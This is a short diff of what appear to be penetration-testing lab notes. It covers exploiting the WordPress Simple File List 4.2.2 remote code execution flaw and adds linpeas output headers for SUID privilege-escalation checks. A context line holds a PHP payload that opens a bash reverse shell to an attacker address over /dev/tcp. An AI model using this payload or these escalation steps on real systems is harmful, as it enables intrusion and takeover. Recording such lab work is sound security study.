@@ -344,7 +344,12 @@ WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                 
 vi 48449.py
 payload = '<?php passthru("bash -i >& /dev/tcp/192.168.45.185/22 0>&1"); ?>'
 
-
+# linpeas.sh
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                          
+                      ╚════════════════════════════════════╝                                                                                                
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid    
 ```
 
 ### Cockpit
